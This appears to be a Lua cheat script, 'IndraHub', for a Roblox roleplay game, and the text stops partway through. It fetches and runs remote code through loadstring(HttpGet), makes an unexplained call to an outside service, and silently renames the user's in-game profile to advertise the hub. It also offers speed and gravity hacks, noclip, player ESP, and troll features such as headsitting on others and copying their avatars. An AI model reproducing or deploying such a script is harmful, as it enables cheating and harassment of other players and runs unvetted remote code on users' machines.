local success, content = pcall(function()
    return game:HttpGet("https://nexviewsservice.shardweb.app/services/s4turn_hub/start")
end)

game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
    [1] = "RolePlayBio",
    [2] = "IndraHub user",
}))

game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
    [1] = "RolePlayName",
    [2] = "IndraHub",
}))

game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]:FireServer(table.unpack({
    [1] = "PickingRPBioColor",
    [2] = Color3.new(0, 0, 0),
}))

game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]:FireServer(table.unpack({
    [1] = "PickingRPNameColor",
    [2] = Color3.new(255, 255, 255),
}))

-- [IndraHub] Cleanup & Unique Execution ID
getgenv().IndraExecId = game:GetService("HttpService"):GenerateGUID(false)
local CurrentExecId = getgenv().IndraExecId

-- Destroy old UI instances
if game.CoreGui:FindFirstChild("IndraHubToggle") then
    game.CoreGui.IndraHubToggle:Destroy()
end

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- Function to check if script is still running (for loops)
local function IsScriptActive()
    return getgenv().IndraExecId == CurrentExecId
end

-- Clickable Logo / Toggle Button (IndraHub)
task.spawn(function()
    if not IsScriptActive() then return end
    local CoreGui = game:GetService("CoreGui")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    
    -- Create ScreenGui
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "IndraHubToggle"
    if syn and syn.protect_gui then 
        syn.protect_gui(ScreenGui) 
        ScreenGui.Parent = CoreGui
    elseif gethui then 
        ScreenGui.Parent = gethui() 
    else 
        ScreenGui.Parent = CoreGui 
    end

    -- Create Button (TextButton "IH")
    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Name = "ToggleButton"
    ToggleButton.Parent = ScreenGui
    ToggleButton.BackgroundColor3 = Color3.fromHex("#1a1a1a")
    ToggleButton.BackgroundTransparency = 0
    ToggleButton.Position = UDim2.new(0, 50, 0, 50)
    ToggleButton.Size = UDim2.new(0, 45, 0, 45)
    ToggleButton.Text = "IH"
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.TextSize = 20
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.Active = true
    ToggleButton.Draggable = true 
    ToggleButton.AutoButtonColor = true

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = ToggleButton
    
    local Stroke = Instance.new("UIStroke")
    Stroke.Parent = ToggleButton
    Stroke.Color = Color3.fromHex("#8b5cf6")
    Stroke.Thickness = 2
    Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    -- Toggle Logic
    ToggleButton.MouseButton1Click:Connect(function()
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.V, false, game)
        task.wait(0.05)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.V, false, game)
    end)
    
    -- Cleanup Check Loop for Button
    task.spawn(function()
        while ScreenGui.Parent do
             task.wait(1)
             if not IsScriptActive() then
                 ScreenGui:Destroy()
                 break
             end
        end
    end)
end)

local Window = WindUI:CreateWindow({
    Title = "IndraHub",
    Icon = "star",
    Author = "Indra",
    Folder = "IndraHub",
    Size = UDim2.fromOffset(500, 350),
    Transparent = true,
    Theme = "Dark",
    Resizable = true,
    SideBarWidth = 150,
    BackgroundImageTransparency = 0.8,
    HideSearchBar = false,
    ScrollBarEnabled = true
})

Window:EditOpenButton({
    Title = "Toggle",
    Icon = "zap",
    CornerRadius = UDim.new(0, 6),
    StrokeThickness = 2,
    Color = ColorSequence.new(Color3.fromRGB(138, 43, 226), Color3.fromRGB(173, 216, 230)),
    Draggable = true
})

task.delay(1, function()
    Window:Dialog({
        Title = "IndraHub Discord",
        Text = "IndraHub",
        Options = {
            {
                "Discord",
                function()
                    local discordLink = "https://discord.gg/mTuswcZf4"
                    if setclipboard then
                        setclipboard(discordLink)
                        WindUI:Notify({
                            Title = "IndraHub",
                            Content = "copied lol",
                            Duration = 5,
                            Icon = "copy"
                        })
                    else
                        WindUI:Notify({
                            Title = "NOTIFICATION",
                            Content = "Your executor does not support automatic text copying.",
                            Duration = 5,
                            Icon = "alert-triangle"
                        })
                    end
                end
            },
            {
                "Open",
                function()
                    WindUI:Notify({
                        Title = "IndraHub",
                        Content = "Welcome to IndraHub",
                        Duration = 5,
                        Icon = "info"
                    })
                end
            }
        }
    })
end)

local function WrapTab(tab)
    function tab:AddSection(args)
        if type(args) == "table" then
            return self:Section({ Title = args[1] or args.Name or "Section", Icon = args.Icon or "book" })
        else
             return self:Section({ Title = tostring(args), Icon = "book" })
        end
    end
    function tab:AddButton(args)
        if type(args) == "table" and args[1] then
             return self:Button({ Title = args[1], Callback = args[2] })
        else
             return self:Button({ Title = args.Name, Desc = args.Description, Callback = args.Callback })
        end
    end
    function tab:AddToggle(args)
        return self:Toggle({ Title = args.Name, Desc = args.Description, Value = args.Default, Callback = args.Callback })
    end
    function tab:AddDropdown(args)
        return self:Dropdown({ Title = args.Name, Desc = args.Description, Values = args.Options, Value = args.Default, Multi = args.Multi, Callback = args.Callback })
    end
    function tab:AddSlider(args)
        return self:Slider({ 
            Title = args.Name, 
            Value = {
                Min = args.MinValue or args.Min or 0, 
                Max = args.MaxValue or args.Max or 100, 
                Default = args.Default or 50 
            }, 
            Callback = args.Callback 
        })
    end
    function tab:AddParagraph(args)
        local title = args.Title or args[1] or "Info"
        local content = args.Content or args[2] or ""
        return self:Button({ Title = title, Desc = content, Callback = function() end }) 
    end
    function tab:AddTextBox(args)
        return self:Input({
             Title = args.Name,
             Desc = args.Description,
             Placeholder = args.PlaceholderText,
             Callback = args.Callback
        })
    end
    function tab:AddDiscordInvite(args)
         return self:Button({
             Title = args.Name,
             Desc = args.Description .. " (" .. args.Invite .. ")",
             Callback = function() 
                if setclipboard then setclipboard(args.Invite) end
                WindUI:Notify({ Title = "IndraHub", Content = "Discord Link Copied!", Icon = "copy" })
             end
         })
    end
    return tab
end

local Tab1 = WrapTab(Window:Tab({ Title = "Credits", Icon = "info", Desc = "Credits & Info" }))
local Tab2 = WrapTab(Window:Tab({ Title = "Browser", Icon = "globe", Desc = "Web Browser" }))
local Tab3 = WrapTab(Window:Tab({ Title = "Fun", Icon = "gamepad-2", Desc = "Fun Features" }))
local Tab4 = WrapTab(Window:Tab({ Title = "Avatar", Icon = "shirt", Desc = "Character Customization" }))
local Tab5 = WrapTab(Window:Tab({ Title = "House", Icon = "home", Desc = "House Control" }))
local Tab6 = WrapTab(Window:Tab({ Title = "Car", Icon = "car", Desc = "Vehicle Spawner" }))
local Tab7 = WrapTab(Window:Tab({ Title = "RGB", Icon = "palette", Desc = "Visual Effects" }))
local Tab8 = WrapTab(Window:Tab({ Title = "Music", Icon = "music", Desc = "Music Player" }))
local Tab9 = WrapTab(Window:Tab({ Title = "Protection", Icon = "shield", Desc = "Safety Features" }))
local Tab10 = WrapTab(Window:Tab({ Title = "Troll", Icon = "skull", Desc = "Troll Features" }))
local Tab11 = WrapTab(Window:Tab({ Title = "Trolling Map", Icon = "map", Desc = "Map Mods" }))
local Tab12 = WrapTab(Window:Tab({ Title = "Scripts", Icon = "scroll", Desc = "External Scripts" }))
local Tab13 = WrapTab(Window:Tab({ Title = "Teleports", Icon = "map-pin", Desc = "Teleport Locations" }))





--------------------------------------------------------------------------------------------------------------------------------
                                                   -- === Tab 1: credits === --
---------------------------------------------------------------------------------------------------------------------------------
local Section = Tab1:Section({ Title = "Hub Credits", Icon = "info" })

Tab1:AddDiscordInvite({
    Name = "IndraHub",
    Description = "Join please :3",
    Logo = "rbxassetid://118954519667920",
    Invite = "https://discord.gg/mTuswcZf4",
})


  

local function detectExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif syn then
        return "Synapse X"
    elseif KRNL_LOADED then
        return "KRNL"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif pebc_execute then
        return "ProtoSmasher"
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown Executor"
    end
end

local executorName = detectExecutor()

local Paragraph = Tab1:AddParagraph({"Executor", executorName})

local Section = Tab1:Section({ Title = "Owners/Developers", Icon = "user" })

local Paragraph = Tab1:AddParagraph({"Creators", "Indra"})

local Section = Tab1:Section({ Title = "Version of the Hub", Icon = "tag" })

local Paragraph = Tab1:AddParagraph({"Version:", "V4"})


  

 ---------------------------------------------------------------------------------------------------------------------------------
                                                   -- === Tab 2: Fun === --
-----------------------------------------------------------------------------------------------------------------------------------



local Section = Tab3:Section({ Title = "Player Character", Icon = "user" })


local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local selectedPlayerName = nil
local headsitActive = false

local function headsitOnPlayer(targetPlayer)
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")

    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Head") then
        warn("Target player has no head or character.")
        return false
    end
    local targetHead = targetPlayer.Character.Head
    local localRoot = character:FindFirstChild("HumanoidRootPart")
    if not localRoot then
        warn("Your character does not have a HumanoidRootPart.")
        return false
    end

    localRoot.CFrame = targetHead.CFrame * CFrame.new(0, 2.2, 0)

    for _, v in pairs(localRoot:GetChildren()) do
        if v:IsA("WeldConstraint") then
            v:Destroy()
        end
    end

    local weld = Instance.new("WeldConstraint")
    weld.Part0 = localRoot
    weld.Part1 = targetHead
    weld.Parent = localRoot

    if humanoid then
        humanoid.Sit = true
    end

    print("Headsit enabled on " .. targetPlayer.Name)
    return true
end

local function removeHeadsit()
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local localRoot = character:FindFirstChild("HumanoidRootPart")
    if localRoot then
        for _, v in pairs(localRoot:GetChildren()) do
            if v:IsA("WeldConstraint") then
                v:Destroy()
            end
        end
    end
    if humanoid then
        humanoid.Sit = false
    end

    print("Headsit disabled.")
end

-- FunÃ§Ã£o para encontrar jogador por nome parcial
local function findPlayerByPartialName(partial)
    partial = partial:lower()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Name:lower():sub(1, #partial) == partial then
            return player
        end
    end
    return nil
end

-- NotificaÃ§Ã£o com imagem do jogador
local function notifyPlayerSelected(player)
    local StarterGui = game:GetService("StarterGui")
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size100x100
    local content, _ = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)

    StarterGui:SetCore("SendNotification", {
        Title = "Player Selected",
        Text = player.Name .. " was selected!",
        Icon = content,
        Duration = 5
    })
end

-- TextBox para digitar nome do player
Tab3:AddTextBox({
    Name = "Player Name",
    Description = "Type part of the name",
    PlaceholderText = "ex: NOOB -> pro",
    Callback = function(Value)
        local foundPlayer = findPlayerByPartialName(Value)
        if foundPlayer then
            selectedPlayerName = foundPlayer.Name
            notifyPlayerSelected(foundPlayer)
        else
            warn("No player found with this name.")
        end
    end
})

-- BotÃ£o para ativar/desativar headsit
-- BotÃ£o para ativar/desativar headsit (versÃ£o simplificada)
Tab3:AddButton({"Enable", function()
    if not selectedPlayerName then
    
        return
    end

    if not headsitActive then
        local target = Players:FindFirstChild(selectedPlayerName)
        if target and headsitOnPlayer(target) then
            headsitActive = true
        end
    else
        removeHeadsit()
        headsitActive = false
    end
end})




Tab3:AddSlider({
    Name = "Speed Player",
    Increase = 1,
    MinValue = 16,
    MaxValue = 888,
    Default = 16,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        if humanoid then
            humanoid.WalkSpeed = Value
        end
    end
 })
 
 Tab3:AddSlider({
    Name = "Jumppower",
    Increase = 1,
    MinValue = 50,
    MaxValue = 500,
    Default = 50,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        if humanoid then
            humanoid.JumpPower = Value
        end
    end
 })
 
 Tab3:AddSlider({
    Name = "Gravity",
    Increase = 1,
    MinValue = 0,
    MaxValue = 10000,
    Default = 196.2,
    Callback = function(Value)
        game.Workspace.Gravity = Value
    end
 })
 
 local InfiniteJumpEnabled = false
 
 game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
       local character = game.Players.LocalPlayer.Character
       if character and character:FindFirstChild("Humanoid") then
          character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
       end
    end
 end)

 Tab3:AddButton({
    Name = "Reset Speed/Gravity/Jumppower.â",
    Callback = function()
        -- Resetar Speed
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 16 -- Valor padrÃ£o do Speed
            humanoid.JumpPower = 50 -- Valor padrÃ£o do JumpPower
        end
        
        -- Resetar Gravity
        game.Workspace.Gravity = 196.2 -- Valor padrÃ£o da gravidade
        
        -- Desativar Infinite Jump
        InfiniteJumpEnabled = false
    end
})
 
 Tab3:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(Value)
       InfiniteJumpEnabled = Value
    end
 })

 local UltimateNoclip = {
    Enabled = false,
    Connections = {},
    SoccerBalls = {}
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- FunÃ§Ã£o para controle de colisÃµes do jogador
local function managePlayerCollisions(character)
    if not character then return end
    
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = not UltimateNoclip.Enabled
            part.Anchored = false
        end
    end
end

-- Sistema anti-void melhorado
local function voidProtection(rootPart)
    if rootPart.Position.Y < -500 then
        local safeCFrame = CFrame.new(0, 100, 0)
        local rayParams = RaycastParams.new()
        rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
        
        local result = Workspace:Raycast(rootPart.Position, Vector3.new(0, 500, 0), rayParams)
        rootPart.CFrame = result and CFrame.new(result.Position + Vector3.new(0, 5, 0)) or safeCFrame
    end
end

-- Controle das bolas de futebol
local function manageSoccerBalls()
    local soccerFolder = Workspace:FindFirstChild("Com", true)
                      and Workspace.Com:FindFirstChild("001_SoccerBalls")
    
    if soccerFolder then
        -- Atualiza bolas existentes
        for _, ball in ipairs(soccerFolder:GetChildren()) do
            if ball.Name:match("^Soccer") then
                pcall(function()
                    ball.CanCollide = not UltimateNoclip.Enabled
                    ball.Anchored = UltimateNoclip.Enabled
                end)
                UltimateNoclip.SoccerBalls[ball] = true
            end
        end
        
        -- Monitora novas bolas
        if not UltimateNoclip.Connections.BallAdded then
            UltimateNoclip.Connections.BallAdded = soccerFolder.ChildAdded:Connect(function(ball)
                if ball.Name:match("^Soccer") then
                    task.wait(0.3)
                    pcall(function()
                        ball.CanCollide = not UltimateNoclip.Enabled
                        ball.Anchored = UltimateNoclip.Enabled
                    end)
                end
            end)
        end
    end
end

-- Loop principal do sistema
local function mainLoop()
    UltimateNoclip.Connections.Heartbeat = RunService.Heartbeat:Connect(function()
        local character = LocalPlayer.Character
        
        -- Controle do jogador
        if character then
            managePlayerCollisions(character)
            
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                voidProtection(rootPart)
            end
        end
        
        -- Atualiza bolas a cada 2 segundos
        if tick() % 2 < 0.1 then
            manageSoccerBalls()
        end
    end)
end

-- ConfiguraÃ§Ã£o do toggle
local NoclipToggle = Tab3:AddToggle({
    Name = "Ultimate Noclip",
    Description = "Noclip + Controle de bolas integrado",
    Default = false
})

NoclipToggle:Callback(function(state)
    UltimateNoclip.Enabled = state
    
    if state then
        -- Inicia sistemas
        mainLoop()
        manageSoccerBalls()
        
        -- Configura respawn
        UltimateNoclip.Connections.CharAdded = LocalPlayer.CharacterAdded:Connect(function()
            task.wait(0.5)
            managePlayerCollisions(LocalPlayer.Character)
        end)
    else
        -- Desativa tudo
        for _, conn in pairs(UltimateNoclip.Connections) do
            conn:Disconnect()
        end
        
        -- Restaura colisÃµes
        if LocalPlayer.Character then
            managePlayerCollisions(LocalPlayer.Character)
        end
        
        -- Restaura bolas
        for ball in pairs(UltimateNoclip.SoccerBalls) do
            if ball.Parent then
                pcall(function()
                    ball.CanCollide = true
                    ball.Anchored = false
                end)
            end
        end
    end
end)
-------------------------------------------------------------------------------
-- Toggle para Anti-Sit
local antiSitConnection = nil
local antiSitEnabled = false

Tab3:AddToggle({
    Name = "Anti-Sit",
    Description = "Prevents player from sitting",
    Default = false,
    Callback = function(state)
        antiSitEnabled = state
        local LocalPlayer = game:GetService("Players").LocalPlayer

        if state then
            local function applyAntiSit(character)
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.Sit = false
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    if antiSitConnection then
                        antiSitConnection:Disconnect()
                    end
                    antiSitConnection = humanoid.Seated:Connect(function(isSeated)
                        if isSeated then
                            humanoid.Sit = false
                            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                        end
                    end)
                end
            end

            if LocalPlayer.Character then
                applyAntiSit(LocalPlayer.Character)
            end

            local characterAddedConnection
            characterAddedConnection = LocalPlayer.CharacterAdded:Connect(function(character)
                if not antiSitEnabled then
                    characterAddedConnection:Disconnect()
                    return
                end
                local humanoid = character:WaitForChild("Humanoid", 5)
                if humanoid then
                    applyAntiSit(character)
                end
            end)
        else
            if antiSitConnection then
                antiSitConnection:Disconnect()
                antiSitConnection = nil
            end

            if LocalPlayer.Character then
                local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end
        end
    end
})

-- ServiÃ§os
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- VariÃ¡veis
local billboardGuis = {}
local connections = {}
local espEnabled = false
local selectedColor = "RGB Suave"

-- BotÃ£o para Fly GUI
Tab3:AddButton({
    Name = "Enable Fly GUI",
    Description = "Loads a universal fly GUI",
    Callback = function()
        local success, _ = pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-gui-v3-30439"))()
        end)

        game.StarterGui:SetCore("SendNotification", {
            Title = success and "Success" or "Error",
            Text = success and "Fly GUI loaded!" or "Failed to load Fly GUI.",
        })
    end
})

local Section = Tab3:Section({ Title = "Tools", Icon = "hammer" })


-- Dropdown de cor
Tab3:AddDropdown({
    Name = "ESP Color",
    Default = "RGB ",
    Options = {
        "RGB", "White", "Black", "Red",
        "Green", "Blue", "Yellow", "Pink", "Purple"
    },
    Callback = function(value)
        selectedColor = value
    end
})

-- FunÃ§Ã£o para obter a cor
local function getESPColor()
    if selectedColor == "RGB" then
        local h = (tick() % 5) / 5
        return Color3.fromHSV(h, 1, 1)
    elseif selectedColor == "Black" then
        return Color3.fromRGB(0, 0, 0)
    elseif selectedColor == "White" then
        return Color3.fromRGB(255, 255, 255)
    elseif selectedColor == "Red" then
        return Color3.fromRGB(255, 0, 0)
    elseif selectedColor == "Green" then
        return Color3.fromRGB(0, 255, 0)
    elseif selectedColor == "Blue" then
        return Color3.fromRGB(0, 170, 255)
    elseif selectedColor == "Yellow" then
        return Color3.fromRGB(255, 255, 0)
    elseif selectedColor == "Pink" then
        return Color3.fromRGB(255, 105, 180)
    elseif selectedColor == "Purple" then
        return Color3.fromRGB(128, 0, 128)
    end
    return Color3.new(1, 1, 1)
end

-- FunÃ§Ã£o para criar o ESP
local function updateESP(player)
    if player == Players.LocalPlayer then return end
    if not espEnabled then return end

    local character = player.Character
    if character then
        local head = character:FindFirstChild("Head")
        if head then
            if billboardGuis[player] then
                billboardGuis[player]:Destroy()
            end

            local billboard = Instance.new("BillboardGui")
            billboard.Name = "ESP_Billboard"
            billboard.Parent = head
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true

            local textLabel = Instance.new("TextLabel")
            textLabel.Name = "TextLabel"
            textLabel.Parent = billboard
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.TextStrokeTransparency = 0.5
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextSize = 14
            textLabel.Text = player.Name .. " | " .. player.AccountAge .. " days"
            textLabel.TextColor3 = getESPColor()

            billboardGuis[player] = billboard
        end
    end
end

-- FunÃ§Ã£o para remover o ESP
local function removeESP(player)
    if billboardGuis[player] then
        billboardGuis[player]:Destroy()
        billboardGuis[player] = nil
    end
end

-- Toggle de ativaÃ§Ã£o do ESP
local Toggle1 = Tab3:AddToggle({
    Name = "ESP Enabled",
    Description = "Shows players' names and account ages.",
    Default = false
})
Toggle1:Callback(function(value)
    espEnabled = value

    if espEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            updateESP(player)
        end

        local updateConnection = RunService.Heartbeat:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                updateESP(player)
            end
            if selectedColor == "RGB" then
                for _, player in pairs(Players:GetPlayers()) do
                    local gui = billboardGuis[player]
                    if gui and gui:FindFirstChild("TextLabel") then
                        gui.TextLabel.TextColor3 = getESPColor()
                    end
                end
            end
        end)
        table.insert(connections, updateConnection)

        local playerAdded = Players.PlayerAdded:Connect(function(player)
            updateESP(player)
            local charConn = player.CharacterAdded:Connect(function()
                updateESP(player)
            end)
            table.insert(connections, charConn)
        end)
        table.insert(connections, playerAdded)

        local playerRemoving = Players.PlayerRemoving:Connect(function(player)
            removeESP(player)
        end)
        table.insert(connections, playerRemoving)

    else
        for _, player in pairs(Players:GetPlayers()) do
            removeESP(player)
        end
        for _, conn in pairs(connections) do
            conn:Disconnect()
        end
        connections = {}
        billboardGuis = {}
    end
end)

----------------------------------------------------------------------------------------------------------------------------------
                                                         -- Tab4:  Avatar Editor--
----------------------------------------------------------------------------------------------------------------------------------

local Section = Tab7:Section({ Title = "Rainbow Car", Icon = "palette" })

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local valor_do_nome_do_joagdor
local Target = nil

local function GetPlayerNames()
    local playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= LocalPlayer.Name then
            table.insert(playerNames, player.Name)
        end
    end
    return playerNames
end

local Dropdown = Tab4:AddDropdown({
    Name = "Players List",
    Description = "",
    Options = GetPlayerNames(),
    Default = "",
    Flag = "player list",
    Callback = function(playername)
        valor_do_nome_do_joagdor = playername
        Target = playername -- Conectar o dropdown ao Copy Avatar
    end
})

local function UptadePlayers()
    Dropdown:Refresh(GetPlayerNames())
end

UptadePlayers()

Tab4:AddButton({"Refresh List", function()
    UptadePlayers()
end})

Players.PlayerAdded:Connect(UptadePlayers)
Players.PlayerRemoving:Connect(UptadePlayers)

Tab4:AddButton({
    Name = "Copy Avatar",
    Callback = function()
        if not Target then return end

        local LP = Players.LocalPlayer
        local LChar = LP.Character
        local TPlayer = Players:FindFirstChild(Target)

        if TPlayer and TPlayer.Character then
            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")

            if LHumanoid and THumanoid then
                -- RESETAR LOCALPLAYER
                local LDesc = LHumanoid:GetAppliedDescription()

                -- Remover acessÃ³rios, roupas e face atuais
                for _, acc in ipairs(LDesc:GetAccessories(true)) do
                    if acc.AssetId and tonumber(acc.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
                        task.wait(0.2)
                    end
                end

                if tonumber(LDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
                    task.wait(0.2)
                end

                if tonumber(LDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
                    task.wait(0.2)
                end

                local PDesc = THumanoid:GetAppliedDescription()

                -- Enviar partes do corpo
                local argsBody = {
                    [1] = {
                        [1] = PDesc.Torso,
                        [2] = PDesc.RightArm,
                        [3] = PDesc.LeftArm,
                        [4] = PDesc.RightLeg,
                        [5] = PDesc.LeftLeg,
                        [6] = PDesc.Head
                    }
                }
                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
                task.wait(0.5)

                if tonumber(PDesc.Shirt) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Pants) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
                    task.wait(0.3)
                end

                if tonumber(PDesc.Face) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
                    task.wait(0.3)
                end

                for _, v in ipairs(PDesc:GetAccessories(true)) do
                    if v.AssetId and tonumber(v.AssetId) then
                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
                        task.wait(0.3)
                    end
                end

                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
                if SkinColor then
                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                    task.wait(0.3)
                end

                if tonumber(PDesc.IdleAnimation) then
                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
                    task.wait(0.3)
                end

                -- Nome, bio e cor
                local Bag = TPlayer:FindFirstChild("PlayersBag")
                if Bag then
                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPNameColor") then
                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
                        task.wait(0.3)
                    end
                    if Bag:FindFirstChild("RPBioColor") then
                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
                        task.wait(0.3)
                    end
                end
            end
        end
    end
})

------------------------------------------------------------------------------------------------------------------------------------
local Section = Tab3:Section({ Title = "Visuals (Fe)", Icon = "eye" })


local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Namespace para evitar conflitos
local AvatarManager = {}
AvatarManager.ReplicatedStorage = ReplicatedStorage

-- FunÃ§Ã£o para exibir notificaÃ§Ã£o
function AvatarManager:MostrarNotificacao(mensagem)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aviso",
            Text = mensagem,
            Duration = 5
        })
    end)
end

-- Tabela de avatares
AvatarManager.Avatares = {
    { Nome = "Gato de Manga", ID = 124948425515124 },
    { Nome = "Tung Saur", ID = 117098257036480 },
    { Nome = "Tralaleiro", ID = 99459753608381 },
    { Nome = "Monstro S.A", ID = 123609977175226 },
    { Nome = "Trenzinho", ID = 80468697076178 },
    { Nome = "Dino", ID = 11941741105 },
    { Nome = "Pou idoso", ID = 15742966010  },
    { Nome = "Coco/boxt@", ID = 77013984520332  },
    { Nome = "Coelho", ID = 71797333686800  },
    { Nome = "HipopÃ³tamo", ID = 73215892129281 },
    { Nome = "Ratatui", ID = 108557570415453 },
    { Nome = "Galinha", ID = 71251793812515 },
    { Nome = "Pepa pig", ID = 92979204778377 },
    { Nome = "pinguin", ID = 94944293759578 },
    { Nome = "Sid", ID = 87442757321244 },
    { Nome = "puga grande", ID = 111436158728716 },
    { Nome = "SHREK AMALDIÃOADO", ID = 120960401202173 },
    { Nome = "mosquito grande", ID = 108052868536435 },
    { Nome = "Noob Invertido", ID = 106596990206151 },
    { Nome = "Pato(a)", ID = 135132836238349 },
    { Nome = "Cachorro Chihuahua", ID = 18656467256 },
    { Nome = "Gato sla", ID = 18994959003 },
    { Nome = "Gato fei ", ID = 77506186615650 },
    { Nome = "Inpostor", ID = 18234669337 },
    { Nome = "Simon amarelo", ID = 75183593514657 },
    { Nome = "Simon azul", ID = 76155710249925 }
    
}
-- FunÃ§Ã£o para obter os nomes dos avatares para o dropdown
function AvatarManager:GetAvatarNames()
    local nomes = {}
    for _, avatar in ipairs(self.Avatares) do
        table.insert(nomes, avatar.Nome)
    end
    return nomes
end

-- FunÃ§Ã£o para equipar o avatar
function AvatarManager:EquiparAvatar(avatarName)
    for _, avatar in ipairs(self.Avatares) do
        if avatar.Nome == avatarName then
            local args = { avatar.ID }
            local success, result = pcall(function()
                return self.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
            end)
            if success then
                self:MostrarNotificacao("Avatar " .. avatarName .. " equipped successfully!")
            else
                self:MostrarNotificacao("Failed to equip avatar " .. avatarName .. "!")
            end
            return
        end
    end
    self:MostrarNotificacao("Avatar " .. avatarName .. " not found!")
end

-- Tab4: OpÃ§Ã£o de Avatar
-- Dropdown para avatares
local AvatarDropdown = Tab4:AddDropdown({
    Name = "3D Accessories",
    Description = "Select to equip",
    Default = nil,
    Options = AvatarManager:GetAvatarNames(),
    Callback = function(avatarSelecionado)
        _G.SelectedAvatar = avatarSelecionado
    end
})

-- BotÃ£o para equipar avatar
